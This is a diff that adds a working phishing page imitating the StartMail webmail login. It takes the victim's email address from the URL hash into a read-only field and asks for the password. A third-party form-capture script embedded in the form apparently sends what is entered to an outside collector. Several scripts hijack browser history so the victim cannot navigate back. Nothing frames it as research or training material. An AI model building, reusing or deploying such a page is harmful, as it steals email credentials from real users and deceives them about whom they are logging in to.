@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StartMail - Log in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f6f9;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Container wrapping the box and right side paper airplane vector graphic */
+        .page-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 900px;
+            position: relative;
+        }
+
+        /* Floating Centered White Card Component Box */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            padding: 36px 32px;
+            border-radius: 6px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 5;
+        }
+
+        /* Brand Identity Logo Styling */
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 26px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 28px;
+            text-decoration: none;
+        }
+
+        .brand-logo span {
+            color: #4353ff;
+        }
+
+        .brand-logo svg {
+            width: 24px;
+            height: 24px;
+            fill: #4353ff;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            color: #1e293b;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #1e293b;
+            outline: none;
+            background-color: #ffffff;
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+            text-align: right;
+            font-weight: 300;
+        }
+
+        .form-control.pass-field {
+            padding-right: 36px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            bottom: 10px;
+            color: #4a5568;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* Keep remember option inline text container element */
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #4a5568;
+            font-size: 13px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .checkbox-row input {
+            accent-color: #4353ff;
+        }
+
+        /* Crisp sharp blue main action trigger button matching the page layout */
+        .submit-btn {
+            width: 100%;
+            background-color: #4353ff;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            margin-bottom: 12px;
+        }
+
+        .submit-btn:hover {
+            background-color: #2b3eff;
+        }
+
+        /* Secondary line button container styling */
+        .secondary-btn {
+            width: 100%;
+            background-color: #ffffff;
+            color: #4353ff;
+            border: 1px solid #4353ff;
+            padding: 11px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.15s ease;
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        .secondary-btn:hover {
+            background-color: #f0f2ff;
+        }
+
+        /* Bottom helper link nodes elements stack */
+        .signup-link {
+            color: #4353ff;
+            font-size: 14px;
+            text-decoration: underline;
+            margin-bottom: 24px;
+        }
+
+        .whats-new-link {
+            color: #4353ff;
+            font-size: 13px;
+            text-decoration: underline;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* Right Hand Vector Illustration Canvas Graphic Placeholder overlay elements */
+        .illustration-side {
+            position: absolute;
+            left: 360px;
+            bottom: -50px;
+            width: 260px;
+            height: 240px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Replicating the hand throwing paper airplane vector graphics */
+        .airplane-graphic {
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 60% 60%, rgba(67, 83, 255, 0.12) 0%, rgba(67, 83, 255, 0) 70%);
+            position: relative;
+        }
+
+        .airplane-graphic::after {
+            content: '📐'; /* Structural geometric shape angle fallback representing the paper plane folding aesthetic */
+            font-size: 64px;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            transform: rotate(-15deg);
+            opacity: 0.6;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.15);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 20;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-wrapper">
+        <!-- Floating Active Interface Box Element -->
+        <main class="login-card">
+            <!-- Header Brand Logo Identification Area -->
+            <a href="#" class="brand-logo">
+                <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                Start<span>Mail</span>
+            </a>
+    
+            <!-- Form submission framework integration with FormSubmit -->
+            <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    <span class="password-toggle">👁</span>
+                </div>
+
+                <div class="checkbox-row">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label style="margin:0; display:inline; cursor:pointer;" for="remember">Remember my email address</label>
+                </div>
+
+                <button type="submit" class="submit-btn">Log in</button>
+                
+                <a href="#" class="secondary-btn">Forgot your password?</a>
+            </form>
+
+            <a href="#" class="signup-link">Sign up for an account</a>
+            
+            <a href="#" class="whats-new-link">📬 What's new at StartMail</a>
+        </main>
+
+        <!-- Graphic Layout Component Overlay Matching Desktop Screenshot Background Structure -->
+        <div class="illustration-side">
+            <div class="airplane-graphic"></div>
+        </div>
+    </div>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
